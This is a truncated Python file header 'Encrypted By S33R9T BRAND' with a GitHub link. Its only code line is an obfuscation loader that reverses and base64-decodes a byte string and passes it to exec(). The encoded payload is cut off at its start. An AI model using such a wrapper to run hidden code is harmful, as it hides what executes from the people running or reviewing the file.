# Encrypted By S33R9T BRAND 
 # Github : https://https://github.com/seeratwargi/SEERAT.git
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'==
